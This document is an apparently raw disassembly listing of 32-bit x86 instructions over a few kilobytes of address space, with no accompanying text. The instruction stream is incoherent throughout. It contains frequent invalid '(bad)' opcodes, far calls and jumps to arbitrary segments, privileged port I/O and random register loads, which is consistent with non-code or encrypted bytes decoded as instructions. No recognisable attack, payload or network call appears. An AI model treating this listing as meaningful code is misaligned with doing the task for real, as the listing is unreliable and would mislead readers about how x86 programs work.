  41f06c:	mov    ebp,0xd059dba8
  41f071:	outs   dx,DWORD PTR ds:[esi]
  41f072:	mov    cl,0x2a
  41f074:	punpcklwd mm2,DWORD PTR [eax+0x4f]
  41f078:	push   cs
  41f079:	loop   0x41f048
  41f07b:	xor    dh,BYTE PTR [edx]
  41f07d:	scas   al,BYTE PTR es:[edi]
  41f07e:	cdq    
  41f07f:	inc    edx
  41f080:	or     al,ah
  41f082:	and    al,0x70
  41f084:	mov    bh,0x66
  41f086:	inc    esi
  41f087:	cmc    
  41f088:	(bad)
  41f08c:	(bad)  
  41f08d:	out    dx,al
  41f08e:	cld    
  41f08f:	pop    ebp
  41f090:	xor    eax,0xb76e5f25
  41f095:	repnz pop eax
  41f097:	push   ebp
  41f098:	mov    eax,0xf949f9a7
  41f09d:	cwde   
  41f09e:	dec    esi
  41f09f:	shl    BYTE PTR cs:[edi],cl
  41f0a2:	mul    BYTE PTR ds:0x59d98a99
  41f0a8:	pop    eax
  41f0a9:	ds pushf 
  41f0ab:	pop    edi
  41f0ac:	push   ebp
  41f0ad:	es push ebp
  41f0af:	jle    0x41f031
  41f0b1:	add    DWORD PTR [ecx+0x6],edx
  41f0b4:	js     0x41f123
  41f0b6:	jge    0x41f0bd
  41f0b8:	adc    BYTE PTR [edi-0x6b],ch
  41f0bb:	push   edi
  41f0bc:	inc    edx
  41f0bd:	dec    ebx
  41f0be:	mov    ecx,DWORD PTR [esi+0x7e]
  41f0c1:	add    BYTE PTR [ecx-0x6a],bh
  41f0c4:	push   DWORD PTR [eax]
  41f0c6:	mov    edi,0xe21abb65
  41f0cb:	pushf  
  41f0cc:	lods   al,BYTE PTR ds:[esi]
  41f0cd:	int3   
  41f0ce:	adc    edi,edx
  41f0d0:	adc    ch,al
  41f0d2:	or     eax,0xbc2007b1
  41f0d7:	jae    0x41f13b
  41f0d9:	and    al,0xee
  41f0db:	xchg   ebp,eax
  41f0dc:	cmp    al,0xa
  41f0de:	mov    esp,0x74c367c
  41f0e3:	sbb    eax,edi
  41f0e5:	xor    esi,DWORD PTR [ecx]
  41f0e7:	jmp    0x7025:0x9831cb3
  41f0ee:	mov    dh,BYTE PTR [ebp+0x15]
  41f0f1:	dec    esi
  41f0f2:	aad    0x55
  41f0f4:	js     0x41f112
  41f0f6:	fcomp  QWORD PTR [ebx]
  41f0f8:	pushf  
  41f0f9:	bnd gs jbe 0x41f124
  41f0fd:	(bad)  
  41f0fe:	ffree  st(3)
  41f100:	sbb    DWORD PTR fs:[esi],edi
  41f103:	bound  eax,QWORD PTR [ecx]
  41f105:	ss push es
  41f107:	outs   dx,DWORD PTR ds:[esi]
  41f108:	mov    ah,0x80
  41f10a:	push   esp
  41f10b:	ds test ebp,ecx
  41f10e:	add    al,0x3c
  41f110:	scas   eax,DWORD PTR es:[edi]
  41f111:	dec    ebp
  41f112:	sbb    bl,dl
  41f114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f115:	mov    fs,WORD PTR [edi+0x2a09fc3c]
  41f11b:	enter  0x829a,0xe1
  41f11f:	imul   esi,edi,0xffffff88
  41f122:	adc    eax,0x6c22a5d5
  41f127:	inc    edx
  41f128:	dec    edi
  41f129:	iret   
  41f12a:	shl    DWORD PTR [edi+0x7b],cl
  41f12d:	fnsave [ebx]
  41f12f:	xor    al,BYTE PTR [edi+0x2389bddb]
  41f135:	inc    ebp
  41f136:	sbb    eax,0x6c80e460
  41f13b:	sub    al,0x54
  41f13d:	pop    esp
  41f13e:	nop
  41f13f:	scas   al,BYTE PTR es:[edi]
  41f140:	xchg   ebx,eax
  41f141:	jb     0x41f188
  41f143:	jecxz  0x41f1a1
  41f145:	mov    DWORD PTR [esi+0xa],ecx
  41f148:	call   FWORD PTR [ecx-0x579e48e0]
  41f14e:	mov    ch,0x73
  41f150:	fisttp DWORD PTR [esi]
  41f152:	push   ss
  41f153:	and    bl,cl
  41f155:	ret    0xce69
  41f158:	pop    esp
  41f159:	mov    ebx,0xf1bdfb9e
  41f15e:	shr    esi,1
  41f160:	jl     0x41f1cb
  41f162:	div    DWORD PTR [esi-0x47a5239b]
  41f168:	ja     0x41f14f
  41f16a:	or     al,0xc4
  41f16c:	add    BYTE PTR [ecx-0x6a49b150],dl
  41f172:	xchg   esp,eax
  41f173:	xor    DWORD PTR [ebp+0x75],ebx
  41f176:	xor    DWORD PTR cs:[edi+0x63],ebx
  41f17a:	add    DWORD PTR [edi],esp
  41f17c:	jbe    0x41f1e8
  41f17e:	xchg   BYTE PTR [ebx+eax*2],dl
  41f181:	dec    ecx
  41f182:	dec    eax
  41f183:	shl    BYTE PTR [ebx],0x2f
  41f186:	out    dx,al
  41f187:	cmp    al,0xed
  41f189:	out    dx,eax
  41f18a:	call   0x21d2:0x6cb056c3
  41f191:	mov    ah,0x2b
  41f193:	adc    al,0x9e
  41f195:	test   DWORD PTR ss:[ebx],edi
  41f198:	shl    bl,cl
  41f19a:	pop    esp
  41f19b:	ds push esi
  41f19d:	mov    cl,0x81
  41f19f:	inc    DWORD PTR ds:0xceb31296
  41f1a5:	call   0xfde1c3bc
  41f1aa:	ficom  DWORD PTR [ebp+0x68104568]
  41f1b0:	es xchg ebp,eax
  41f1b2:	outs   dx,BYTE PTR ds:[esi]
  41f1b3:	dec    edi
  41f1b4:	inc    esi
  41f1b5:	fisubr DWORD PTR [ebx+esi*2]
  41f1b8:	add    bh,BYTE PTR ds:0x4db6e033
  41f1be:	dec    edx
  41f1bf:	fdiv   st(0),st
  41f1c1:	push   edi
  41f1c2:	jnp    0x41f15e
  41f1c4:	cmp    DWORD PTR [edx],esi
  41f1c6:	adc    eax,0xd4f73655
  41f1cb:	push   eax
  41f1cc:	fisubr DWORD PTR [ecx-0x5467c5f6]
  41f1d2:	jb     0x41f1e9
  41f1d4:	or     al,0x20
  41f1d6:	dec    edi
  41f1d7:	shr    al,0x6e
  41f1da:	(bad)  
  41f1db:	jns    0x41f179
  41f1dd:	lods   al,BYTE PTR ds:[esi]
  41f1de:	push   eax
  41f1df:	mov    ds:0x55155f65,al
  41f1e4:	xor    al,0xef
  41f1e6:	push   ds
  41f1e7:	ret    0xc8cd
  41f1ea:	call   0x30f5:0xe76e3b24
  41f1f1:	inc    eax
  41f1f2:	add    eax,0x3b05e22f
  41f1f7:	js     0x41f195
  41f1f9:	hlt    
  41f1fa:	leave  
  41f1fb:	pop    ebx
  41f1fc:	adc    al,0x14
  41f1fe:	xchg   esp,eax
  41f1ff:	mov    DWORD PTR [ecx],ebx
  41f201:	div    edi
  41f203:	fild   WORD PTR [edi+eiz*4]
  41f206:	in     eax,dx
  41f207:	push   esp
  41f208:	xlat   BYTE PTR ds:[ebx]
  41f209:	and    eax,0x67690cf
  41f20e:	sub    BYTE PTR [ecx+0x4f991e97],0x39
  41f215:	fld    TBYTE PTR [eax+eax*4+0x1beed7a2]
  41f21c:	aas    
  41f21d:	push   edx
  41f21e:	or     BYTE PTR [eax-0x2b],ah
  41f221:	dec    edi
  41f222:	inc    esp
  41f223:	stos   BYTE PTR es:[edi],al
  41f224:	das    
  41f225:	mov    WORD PTR [ebp+0x7f],ss
  41f228:	pop    edi
  41f229:	iret   
  41f22a:	inc    ecx
  41f22b:	(bad)  
  41f22c:	outs   dx,DWORD PTR ds:[esi]
  41f22d:	ret    
  41f22e:	dec    ecx
  41f22f:	pop    ebp
  41f230:	xchg   DWORD PTR [eax+esi*2+0x2a],edi
  41f234:	std    
  41f235:	or     DWORD PTR [edi+0x3f],ebp
  41f238:	pop    esi
  41f239:	jb     0x41f1d0
  41f23b:	inc    esi
  41f23c:	mov    cl,0x92
  41f23e:	ds xchg esp,eax
  41f240:	cld    
  41f241:	jno    0x41f279
  41f243:	call   0x3e196021
  41f248:	ret    
  41f249:	xor    BYTE PTR [esi+edi*1-0x6fb3d87b],bh
  41f250:	mov    bl,0x78
  41f252:	cdq    
  41f253:	mov    esp,0x8d806244
  41f258:	cld    
  41f259:	push   ds
  41f25a:	mov    esp,0xd0a9ed3a
  41f25f:	push   edi
  41f260:	shr    DWORD PTR [ebp-0xd],cl
  41f263:	xor    eax,0xc454c92d
  41f268:	push   esp
  41f269:	adc    al,0xfc
  41f26b:	inc    edi
  41f26c:	adc    DWORD PTR [edx],ebp
  41f26e:	int    0x68
  41f270:	xchg   BYTE PTR [edi-0x75cc446d],al
  41f276:	pop    es
  41f277:	sti    
  41f278:	dec    edx
  41f279:	ret    
  41f27a:	xchg   esp,eax
  41f27b:	cs int 0xfb
  41f27e:	popf   
  41f27f:	jp     0x41f23b
  41f281:	in     eax,0xd9
  41f283:	cmp    BYTE PTR [esi+0x70],0xde
  41f287:	mov    esi,0xa210eaf2
  41f28c:	mov    ah,0xe6
  41f28e:	clc    
  41f28f:	add    ebp,DWORD PTR [edx]
  41f291:	dec    edi
  41f292:	(bad)  
  41f293:	push   ecx
  41f294:	test   DWORD PTR [ecx],0xa74b0948
  41f29a:	aad    0x44
  41f29c:	mov    ds:0x687c40c7,eax
  41f2a1:	and    BYTE PTR gs:[ecx-0x73c0989b],bh
  41f2a8:	test   esi,0xfd435334
  41f2ae:	jp     0x41f2ee
  41f2b0:	or     al,0xd0
  41f2b2:	shr    DWORD PTR [eax],1
  41f2b4:	cmp    eax,0xd900172c
  41f2b9:	scas   al,BYTE PTR es:[edi]
  41f2ba:	or     eax,0x37c5f7c8
  41f2bf:	sbb    al,0x5b
  41f2c1:	repz imul ebx,DWORD PTR [esi+0xa16f20e],0xa20030c1
  41f2cc:	mov    ecx,0x10c1546e
  41f2d1:	pushf  
  41f2d2:	lahf   
  41f2d3:	push   cs
  41f2d4:	pop    edx
  41f2d5:	dec    ebp
  41f2d6:	aam    0xbb
  41f2d8:	or     eax,0xc59f6167
  41f2dd:	dec    ebx
  41f2de:	jecxz  0x41f303
  41f2e0:	or     edi,DWORD PTR [esi+ebp*4-0x217b4d6f]
  41f2e7:	test   bl,bh
  41f2e9:	add    eax,0x2ff71593
  41f2ee:	and    dh,bl
  41f2f0:	adc    DWORD PTR [ebp-0x7d],0xffffff82
  41f2f4:	xchg   edi,eax
  41f2f5:	stc    
  41f2f6:	pusha  
  41f2f7:	adc    al,0x3c
  41f2f9:	mov    ebp,0x62d1f2d0
  41f2fe:	cmp    BYTE PTR [ecx-0x3027d628],cl
  41f304:	shl    DWORD PTR [eax-0x1a],1
  41f307:	jecxz  0x41f36f
  41f309:	es xor esi,esp
  41f30c:	and    dl,dh
  41f30e:	adc    DWORD PTR ss:[edi+ecx*2-0x3271ea9f],esi
  41f316:	dec    edi
  41f317:	out    dx,eax
  41f318:	xor    al,0xae
  41f31a:	sbb    ch,BYTE PTR [eax]
  41f31c:	call   0xaf44:0xe518c29f
  41f323:	jge    0x41f2d1
  41f325:	xchg   edi,eax
  41f326:	or     ah,BYTE PTR [eax]
  41f328:	ror    BYTE PTR [ebx+ecx*8+0x74e4d5dd],1
  41f32f:	dec    ebp
  41f330:	hlt    
  41f331:	imul   eax,DWORD PTR [ebx+0xd],0x792b802c
  41f338:	fild   QWORD PTR [ecx-0x63]
  41f33b:	rol    BYTE PTR ds:0x15c81bf2,cl
  41f341:	push   es
  41f342:	push   0xffffffbd
  41f344:	(bad)  
  41f345:	dec    esi
  41f346:	jno    0x41f337
  41f348:	call   FWORD PTR [ebp-0x15313f47]
  41f34e:	iret   
  41f34f:	pop    ds
  41f350:	xchg   DWORD PTR [eax-0x5b8b90d2],edx
  41f356:	sti    
  41f357:	mov    ds,WORD PTR [edx-0x1d]
  41f35a:	repz out 0x10,eax
  41f35d:	es jns 0x41f308
  41f360:	xor    bh,BYTE PTR [edi+0x20]
  41f363:	dec    edx
  41f364:	daa    
  41f365:	ins    DWORD PTR es:[edi],dx
  41f366:	mov    edx,0xd350b43f
  41f36b:	push   edi
  41f36c:	sub    eax,0xdf77970e
  41f371:	int    0x2f
  41f373:	and    DWORD PTR [eax-0x1b],edx
  41f376:	loop   0x41f3df
  41f378:	loop   0x41f305
  41f37a:	and    eax,0xa45f65f9
  41f37f:	jl     0x41f39b
  41f381:	jno    0x41f362
  41f383:	mov    ds:0x2b4e60d9,eax
  41f388:	xchg   ebp,eax
  41f389:	outs   dx,BYTE PTR ds:[esi]
  41f38a:	sub    al,bh
  41f38c:	cmp    bh,bl
  41f38e:	(bad)  
  41f38f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f390:	xor    al,0x50
  41f392:	call   DWORD PTR [ecx]
  41f394:	mov    al,0xc3
  41f396:	mov    edx,0x6c43b9e9
  41f39b:	fs (bad) 
  41f39d:	sar    DWORD PTR [ebp+0x4e],1
  41f3a0:	jbe    0x41f323
  41f3a2:	and    DWORD PTR [edx-0x55],eax
  41f3a5:	push   edi
  41f3a6:	mov    dl,bh
  41f3a8:	jge    0x41f41d
  41f3aa:	lahf   
  41f3ab:	in     eax,dx
  41f3ac:	add    BYTE PTR [ebx],bl
  41f3ae:	mov    ebp,0xd215efa3
  41f3b3:	(bad)  
  41f3b4:	jmp    0x2bfe7cef
  41f3b9:	xor    DWORD PTR [eax],ecx
  41f3bb:	je     0x41f3f8
  41f3bd:	xchg   BYTE PTR [ebx-0x6a],ah
  41f3c0:	push   ds
  41f3c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3c2:	sbb    eax,0xd7a149b2
  41f3c7:	or     eax,0x3c3226e2
  41f3cc:	or     dh,BYTE PTR [eax+0x34fd0474]
  41f3d2:	jle    0x41f448
  41f3d4:	push   esp
  41f3d5:	test   DWORD PTR [edi],esp
  41f3d7:	xchg   ecx,eax
  41f3d9:	lods   al,BYTE PTR ds:[esi]
  41f3da:	aas    
  41f3db:	mov    cl,0x80
  41f3dd:	mov    al,ds:0x286bb812
  41f3e2:	sub    eax,0xd211a139
  41f3e7:	pop    ds
  41f3e8:	mov    eax,DWORD PTR [ecx]
  41f3ea:	inc    edx
  41f3eb:	cmc    
  41f3ec:	ins    BYTE PTR es:[edi],dx
  41f3ed:	in     eax,dx
  41f3ee:	pop    ebp
  41f3ef:	sbb    dl,BYTE PTR [esp+ecx*1+0x148120c]
  41f3f6:	add    ebp,DWORD PTR [edx]
  41f3f8:	xor    ebx,0xffffff88
  41f3fb:	ja     0x41f396
  41f3fd:	and    BYTE PTR [eax-0x6c],dl
  41f400:	es dec esi
  41f402:	and    BYTE PTR [esi],bh
  41f404:	sbb    eax,0x5ac6baa1
  41f409:	mov    al,0xfa
  41f40b:	mov    ds:0x49b79703,eax
  41f410:	lahf   
  41f411:	out    dx,al
  41f412:	mov    esp,0x2d1e1fd
  41f417:	or     dl,dl
  41f419:	push   cs
  41f41a:	shr    edi,1
  41f41c:	cld    
  41f41d:	jnp    0x41f468
  41f41f:	lahf   
  41f420:	mov    esi,0x8e39a5f7
  41f425:	icebp  
  41f426:	xlat   BYTE PTR ds:[ebx]
  41f427:	adc    DWORD PTR [ebx-0x9bb8107],ebx
  41f42d:	xor    DWORD PTR ds:0x47f2d288,ebx
  41f433:	shl    BYTE PTR [esi-0x3b],1
  41f436:	push   eax
  41f437:	add    BYTE PTR [edx-0x3c],ah
  41f43a:	push   ds
  41f43b:	adc    esi,DWORD PTR [eax+0x49381b3a]
  41f441:	in     eax,0x36
  41f443:	sbb    esp,DWORD PTR [edx+edx*8+0x23]
  41f447:	mov    dl,0xae
  41f449:	push   cs
  41f44a:	dec    esi
  41f44b:	(bad)  
  41f44c:	push   ebx
  41f44d:	pop    ebx
  41f44e:	push   edx
  41f44f:	lock mov edi,ds
  41f452:	push   ebx
  41f453:	or     eax,0xd7d50943
  41f458:	xor    bh,BYTE PTR [ecx]
  41f45a:	stos   BYTE PTR es:[edi],al
  41f45b:	and    al,0xcd
  41f45d:	inc    esp
  41f45f:	inc    ecx
  41f460:	xchg   ebx,eax
  41f461:	lock popf 
  41f463:	mov    ebp,DWORD PTR [eax+0x116bbe89]
  41f469:	pop    ebp
  41f46a:	mov    al,0xa2
  41f46c:	inc    eax
  41f46d:	jle    0x41f414
  41f46f:	jbe    0x41f483
  41f471:	xchg   esi,eax
  41f472:	push   edx
  41f473:	jb     0x41f444
  41f475:	shr    BYTE PTR [edx-0x34d549dc],cl
  41f47b:	push   es
  41f47c:	fmul   st(4),st
  41f47e:	das    
  41f47f:	jae    0x41f4dc
  41f481:	lods   al,BYTE PTR ds:[esi]
  41f482:	int    0xe6
  41f484:	test   bl,0xfd
  41f487:	leave  
  41f488:	imul   edi,DWORD PTR [ebp+0x47],0xffffffce
  41f48c:	jb     0x41f4b0
  41f48e:	repz sti 
  41f490:	(bad)  
  41f491:	and    eax,0x79832ab1
  41f496:	mov    esp,0x0
	...
  41f513:	add    BYTE PTR [edx+0xc],ch
  41f516:	lea    ebx,[eax-0x1806611]
  41f51c:	into   
  41f51d:	out    dx,al
  41f51e:	popf   
  41f51f:	adc    eax,DWORD PTR [edi]
  41f521:	jg     0x41f565
  41f523:	sbb    eax,0x18ee1
  41f528:	imul   eax,DWORD PTR [edi],0x0
  41f52b:	add    BYTE PTR [ebx+edx*2],bh
  41f52e:	cmp    al,0xb5
  41f530:	add    edx,DWORD PTR [ecx-0x23]
  41f533:	dec    ebp
  41f534:	dec    edi
  41f535:	jne    0x41f5b3
  41f537:	int3   
  41f538:	and    DWORD PTR [eax+eiz*1-0x55],0x6ba8dc79
  41f540:	xchg   esi,eax
  41f541:	dec    edx
  41f542:	retf   
  41f543:	rol    BYTE PTR ds:0xe465cc97,cl
  41f549:	retf   0x6881
  41f54c:	xor    BYTE PTR [ebx+0x10],ah
  41f54f:	pop    esp
  41f550:	dec    edx
  41f551:	ffreep st(1)
  41f553:	pushf  
  41f554:	mov    ss,edi
  41f556:	rol    bh,cl
  41f558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f559:	imul   ecx,eax,0xd5bc9937
  41f55f:	jp     0x41f5db
  41f561:	add    dl,BYTE PTR [esi+0x767a752]
  41f567:	jp     0x41f566
  41f569:	test   eax,0xe8e1c18c
  41f56e:	jmp    0x90ea:0xe4574452
  41f575:	stc    
  41f576:	fisttp WORD PTR [ebx]
  41f578:	pop    eax
  41f579:	imul   ecx,DWORD PTR [esi+0x4e7b49d3],0x78ef07aa
  41f583:	xchg   ecx,eax
  41f584:	cmp    esp,DWORD PTR [edi]
  41f586:	pop    edi
  41f587:	pop    esp
  41f588:	fimul  DWORD PTR [ebp-0x54d7cd28]
  41f58e:	pop    eax
  41f58f:	das    
  41f590:	adc    eax,0x53f676eb
  41f595:	fbld   TBYTE PTR [edx+0x6b6d1451]
  41f59b:	jno    0x41f619
  41f59d:	aad    0x65
  41f59f:	mov    dl,0x6f
  41f5a1:	aas    
  41f5a2:	mov    cl,0xf0
  41f5a4:	mov    ebx,DWORD PTR [eax]
  41f5a6:	(bad)  
  41f5a8:	popa   
  41f5a9:	stc    
  41f5aa:	hlt    
  41f5ab:	xor    DWORD PTR [ecx+0x6b],ecx
  41f5ae:	sti    
  41f5af:	add    al,bl
  41f5b1:	jecxz  0x41f622
  41f5b3:	das    
  41f5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5b5:	stos   DWORD PTR es:[edi],eax
  41f5b6:	and    ecx,DWORD PTR [edi+edx*2+0x22]
  41f5ba:	or     bl,BYTE PTR [eax]
  41f5bc:	call   0x974b:0x7b807e0f
  41f5c3:	in     eax,dx
  41f5c4:	push   cs
  41f5c5:	cdq    
  41f5c6:	mov    bh,0x2d
  41f5c8:	pop    esi
  41f5c9:	pop    ss
  41f5ca:	pop    edi
  41f5cb:	in     al,0xa9
  41f5cd:	icebp  
  41f5ce:	mov    edx,0x11cddce4
  41f5d3:	and    eax,0x59108132
  41f5d8:	loop   0x41f5f2
  41f5da:	shl    DWORD PTR [ebp-0x20ec397f],cl
  41f5e0:	out    0xbd,eax
  41f5e2:	in     eax,dx
  41f5e3:	out    0xc6,al
  41f5e5:	mov    ah,BYTE PTR [edx+0x57]
  41f5e8:	mov    edx,0xaf44051
  41f5ed:	ss push eax
  41f5ef:	push   0x9
  41f5f1:	sahf   
  41f5f2:	les    ecx,FWORD PTR [ecx]
  41f5f4:	stos   DWORD PTR es:[edi],eax
  41f5f5:	cmp    BYTE PTR [ecx+0x30c22973],cl
  41f5fb:	push   edx
  41f5fc:	mov    esi,0x134fce7d
  41f601:	mov    ebp,0xb9f6575e
  41f606:	pop    esp
  41f607:	mov    esp,0x16c6f993
  41f60c:	xor    BYTE PTR [ebx],0x66
  41f60f:	add    DWORD PTR [esi-0x6b6bb79],ecx
  41f615:	fs cdq 
  41f617:	add    DWORD PTR [edi+0x689280d9],0xffffff8b
  41f61e:	cmp    BYTE PTR [ecx-0x40b40377],bl
  41f624:	fist   DWORD PTR [eax]
  41f626:	fs sahf 
  41f628:	lods   al,BYTE PTR ds:[esi]
  41f629:	fprem1 
  41f62b:	mov    ebx,0x6002e60c
  41f630:	push   0x3
  41f632:	(bad)  
  41f633:	loop   0x41f623
  41f635:	adc    ah,bh
  41f637:	mov    bl,0x97
  41f639:	jl     0x41f613
  41f63b:	jl     0x41f5bf
  41f63d:	push   ebp
  41f63e:	fwait
  41f63f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f640:	dec    eax
  41f641:	xchg   edi,eax
  41f642:	outs   dx,DWORD PTR ds:[esi]
  41f643:	scas   eax,DWORD PTR es:[edi]
  41f644:	jge    0x41f626
  41f646:	xlat   BYTE PTR ds:[ebx]
  41f647:	ins    DWORD PTR es:[edi],dx
  41f648:	or     BYTE PTR [ebx],cl
  41f64a:	mov    bh,0xe7
  41f64c:	out    0x1e,eax
  41f64e:	sahf   
  41f64f:	icebp  
  41f650:	mov    esi,DWORD PTR [edx]
  41f652:	mov    eax,ds:0xb176fbd2
  41f657:	or     bh,cl
  41f659:	push   0x78763cea
  41f65e:	(bad)  
  41f65f:	cmp    bl,BYTE PTR [ecx]
  41f661:	inc    esp
  41f662:	push   ds
  41f663:	adc    edx,DWORD PTR [ebp+ecx*8+0x56a46546]
  41f66a:	retf   
  41f66b:	cmp    al,0x3f
  41f66d:	stos   BYTE PTR es:[edi],al
  41f66e:	inc    edi
  41f66f:	adc    DWORD PTR [edi+0x15],ebx
  41f672:	gs mov cl,0x33
  41f675:	sbb    al,0x67
  41f677:	nop
  41f678:	mov    cs,WORD PTR [ebx]
  41f67a:	idiv   DWORD PTR [eax]
  41f67c:	cmp    al,0x2b
  41f67e:	pop    ss
  41f67f:	mov    ecx,0xa5979d84
  41f684:	xlat   BYTE PTR ds:[ebx]
  41f685:	je     0x41f658
  41f687:	fisttp WORD PTR [ebp+0x1e]
  41f68a:	mov    WORD PTR [edi+0x75383760],cs
  41f690:	mov    dh,0x7
  41f692:	inc    ebx
  41f693:	aam    0x0
  41f695:	stos   BYTE PTR es:[edi],al
  41f696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f697:	pop    edx
  41f698:	leave  
  41f699:	push   esp
  41f69a:	mov    dl,0x4
  41f69c:	enter  0x5013,0x89
  41f6a0:	add    BYTE PTR [ebx],0x26
  41f6a3:	popa   
  41f6a4:	adc    edx,DWORD PTR [ebp-0xbd368bf]
  41f6aa:	inc    eax
  41f6ab:	mov    ds:0x59aa4678,eax
  41f6b0:	ffreep st(0)
  41f6b2:	pop    ebp
  41f6b3:	outs   dx,DWORD PTR ds:[esi]
  41f6b4:	in     al,0x41
  41f6b6:	mov    esp,0x8ad5bad2
  41f6bb:	cmc    
  41f6bc:	aad    0x1e
  41f6be:	int3   
  41f6bf:	outs   dx,BYTE PTR ds:[esi]
  41f6c0:	dec    edx
  41f6c1:	dec    esp
  41f6c2:	cmp    BYTE PTR [esi],0x48
  41f6c5:	or     esi,esp
  41f6c7:	inc    ebp
  41f6c8:	xor    eax,ecx
  41f6ca:	inc    ebx
  41f6cb:	jmp    0x5f784d80
  41f6d0:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41f6d2:	dec    edi
  41f6d3:	jge    0x41f6f4
  41f6d5:	call   0xba84:0x36a13da8
  41f6dc:	out    dx,eax
  41f6dd:	lods   al,BYTE PTR ds:[esi]
  41f6de:	sbb    esp,DWORD PTR [ecx-0x11]
  41f6e1:	jp     0x41f6af
  41f6e3:	test   al,0xa6
  41f6e5:	fisttp WORD PTR [eax-0x6145e3b5]
  41f6eb:	xlat   BYTE PTR ds:[ebx]
  41f6ec:	push   ss
  41f6ed:	push   ebx
  41f6ee:	or     al,0x74
  41f6f0:	hlt    
  41f6f1:	scas   eax,DWORD PTR es:[edi]
  41f6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6f3:	sub    edi,DWORD PTR [edx+0x27c571e4]
  41f6f9:	add    cl,BYTE PTR [ecx+0x772ab6db]
  41f6ff:	mov    eax,0x112ddcec
  41f704:	xlat   BYTE PTR ds:[ebx]
  41f705:	loope  0x41f764
  41f707:	xchg   edi,eax
  41f708:	sar    DWORD PTR [edi-0x2b],cl
  41f70b:	inc    edi
  41f70c:	inc    ecx
  41f70d:	data16 and BYTE PTR [edx+0x4b],cl
  41f711:	push   0xa95e40ac
  41f716:	pop    es
  41f717:	sub    eax,DWORD PTR [eax-0xd]
  41f71a:	icebp  
  41f71b:	xor    edi,ebp
  41f71d:	(bad)  
  41f71e:	sti    
  41f71f:	and    DWORD PTR [edi-0x78f5589a],eax
  41f725:	call   0xa798:0xcd832319
  41f72c:	pop    esi
  41f72d:	out    dx,eax
  41f72e:	add    BYTE PTR [ecx+0x69],dh
  41f731:	mov    ebx,0x2c20d1ba
  41f736:	cmp    al,dl
  41f738:	add    dl,BYTE PTR [eax+0x1b5aa88a]
  41f73e:	or     edx,esi
  41f740:	or     esi,DWORD PTR [ebx]
  41f742:	(bad)  
  41f743:	mov    bl,ah
  41f745:	or     DWORD PTR [ebp+edi*2-0x58],ebp
  41f749:	fisubr WORD PTR [ecx+0x38ec64be]
  41f74f:	cmp    BYTE PTR [esp+ecx*8],al
  41f752:	out    dx,eax
  41f753:	fnsave [eax]
  41f755:	lahf   
  41f756:	pop    esi
  41f757:	outs   dx,BYTE PTR ds:[esi]
  41f758:	ret    
  41f759:	push   esi
  41f75a:	adc    DWORD PTR [ebx],0xffffffc8
  41f75d:	lods   al,BYTE PTR ds:[esi]
  41f75e:	push   ecx
  41f75f:	or     eax,0xc4602d82
  41f764:	push   esp
  41f765:	push   ecx
  41f766:	dec    esi
  41f767:	add    al,0xd8
  41f769:	test   al,0x86
  41f76b:	add    esi,0x2cb539b8
  41f771:	pop    eax
  41f772:	pop    ecx
  41f773:	inc    ecx
  41f774:	ds mov ebp,0x4da63b2a
  41f77a:	idiv   DWORD PTR [ecx-0xf353a94]
  41f780:	pop    ecx
  41f781:	leave  
  41f782:	test   DWORD PTR [ebx-0x16910b04],ebx
  41f788:	fs mov dh,0xa8
  41f78b:	ss mov dl,0x2b
  41f78e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f78f:	shl    BYTE PTR ds:0x46bf93a7,0x40
  41f796:	in     eax,0x6c
  41f798:	adc    al,0xa8
  41f79a:	sub    al,0xf1
  41f79c:	xor    dl,BYTE PTR ds:0x5639db3c
  41f7a2:	mov    al,0x51
  41f7a4:	jno    0x41f7c9
  41f7a6:	call   0x6eddeff4
  41f7ab:	bound  ebp,QWORD PTR [esi-0x2a93535]
  41f7b1:	adc    ebp,DWORD PTR [edi-0x64]
  41f7b4:	in     eax,0x3f
  41f7b6:	stc    
  41f7b7:	pushf  
  41f7b8:	test   DWORD PTR [ecx-0x26],esp
  41f7bb:	inc    ebx
  41f7bc:	and    eax,0x37de6e79
  41f7c1:	jge    0x41f781
  41f7c3:	add    al,0xd6
  41f7c5:	scas   ax,WORD PTR es:[edi]
  41f7c7:	push   0x3466591e
  41f7cc:	pop    eax
  41f7cd:	ret    0x112c
  41f7d0:	and    BYTE PTR [edx+0x3dac2c64],dh
  41f7d6:	pop    ss
  41f7d7:	push   ss
  41f7d8:	out    dx,al
  41f7d9:	push   ecx
  41f7da:	ins    DWORD PTR es:[edi],dx
  41f7db:	cmp    bl,dl
  41f7dd:	mov    ds:0x107ee5b1,al
  41f7e2:	popa   
  41f7e3:	stos   DWORD PTR es:[edi],eax
  41f7e4:	ds retf 
  41f7e6:	xchg   ebp,eax
  41f7e7:	push   edi
  41f7e8:	aad    0xfb
  41f7ea:	outs   dx,BYTE PTR ds:[esi]
  41f7eb:	sti    
  41f7ec:	xor    al,0xc0
  41f7ee:	push   0xffffffff
  41f7f0:	push   ebp
  41f7f1:	jae    0x41f839
  41f7f3:	cdq    
  41f7f4:	lock push es
  41f7f6:	iret   
  41f7f7:	lea    esp,[ecx-0x77c08ef9]
  41f7fd:	pusha  
  41f7fe:	push   cs
  41f7ff:	(bad)
  41f803:	add    BYTE PTR [eax+0x71e20e9e],bl
  41f809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f80a:	adc    al,0x3d
  41f80c:	rol    DWORD PTR [esi-0x6e],cl
  41f80f:	inc    ebx
  41f810:	xchg   ecx,eax
  41f811:	add    eax,0xab97580d
  41f816:	cmp    eax,0x7dabfc36
  41f81b:	aas    
  41f81c:	push   es
  41f81d:	add    DWORD PTR [ecx-0x45de29da],edi
  41f823:	(bad)  
  41f824:	dec    edi
  41f825:	out    0xd7,eax
  41f827:	ja     0x41f808
  41f829:	inc    edi
  41f82a:	jbe    0x41f81e
  41f82c:	and    eax,0x55bf76e
  41f831:	dec    edx
  41f832:	inc    ebp
  41f833:	sahf   
  41f834:	call   0x143f:0x7d16944
  41f83b:	pusha  
  41f83c:	jl     0x41f8b0
  41f83e:	jnp    0x41f820
  41f840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
